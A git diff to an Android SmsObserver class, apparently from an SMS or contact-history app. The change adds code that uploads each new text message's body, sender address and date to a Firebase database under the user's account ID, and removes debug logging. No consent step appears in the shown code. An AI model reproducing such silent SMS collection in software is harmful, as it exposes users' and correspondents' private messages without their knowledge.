@@ -25,6 +25,15 @@ import android.os.Handler;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
+import com.facebook.accountkit.Account;
+import com.facebook.accountkit.AccountKit;
+import com.facebook.accountkit.AccountKitCallback;
+import com.facebook.accountkit.AccountKitError;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
+import an.xuan.tong.historycontact.db.SmsSendServer;
+
 
 /**
  * ContentObserver created to handle the sms content provider changes. This entity will be called each time the
@@ -78,28 +87,10 @@ class SmsObserver extends ContentObserver {
             cursor = getSmsContentObserverCursor();
             if (cursor != null && cursor.moveToFirst()) {
                 processSms(cursor);
-                // cursor.moveToNext();
-                String content = cursor.getString(cursor.getColumnIndex("body"));
-                String smsNumber = cursor.getString(cursor.getColumnIndex("address"));
-                String id = cursor.getString(cursor.getColumnIndex("_id"));
-                if (smsChecker("OutgoingSMS to " + smsNumber + ": " + content)) {
-                    //save data into database/sd card here
-                    Log.e("antx", "send+ " + content + " " + smsNumber + " id " + id);
-                }
-                Cursor smsCursor = null;
-                try {
-                    String protocol = cursor.getString(cursor.getColumnIndex(PROTOCOL_COLUM_NAME));
-                    smsCursor = getSmsCursor(protocol);
-                    Sms sms = parseSms(smsCursor);
-                    if (sms != null)
-                        Log.e("antx", "send+ " + sms.toString());
-                } finally {
-                    close(smsCursor);
-                }
             }
-
         } finally {
-            cursor.close();
+            if (cursor != null)
+                cursor.close();
         }
     }
 
@@ -108,7 +99,30 @@ class SmsObserver extends ContentObserver {
         try {
             String protocol = cursor.getString(cursor.getColumnIndex(PROTOCOL_COLUM_NAME));
             smsCursor = getSmsCursor(protocol);
-            Sms sms = parseSms(smsCursor);
+            final Sms sms = parseSms(smsCursor);
+            if (sms != null)
+                AccountKit.getCurrentAccount(
+                        new AccountKitCallback<Account>() {
+                            @Override
+                            public void onSuccess(Account account) {
+                                SmsSendServer smsSendServer = new SmsSendServer(account.getId().toString()
+                                        , sms.getType().toString()
+                                        , sms.getMsg()
+                                        , sms.getDate()
+                                        , ""
+                                        , sms.getAddress().toString()
+                                        , "");
+                                DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
+                                mDatabase.child("SMS").child(account.getId().toString()).setValue(smsSendServer);
+                            }
+
+                            @Override
+                            public void onError(AccountKitError accountKitError) {
+
+                            }
+                        });
+
+
             notifySmsListener(sms);
         } finally {
             close(smsCursor);
@@ -149,9 +163,8 @@ class SmsObserver extends ContentObserver {
             String selection = null;
             String[] selectionArgs = null;
             String sortOrder = null;
-            if (SMS_URI != null)
-                if (contentResolver.query(SMS_URI, projection, selection, selectionArgs, sortOrder) != null)
-                    return contentResolver.query(SMS_URI, projection, selection, selectionArgs, sortOrder);
+            return contentResolver.query(SMS_URI, projection, selection, selectionArgs, sortOrder);
+        } catch (IllegalArgumentException e) {
             return null;
         } finally {
             Log.e("antx ", "getSmsContentObserverCursor null");
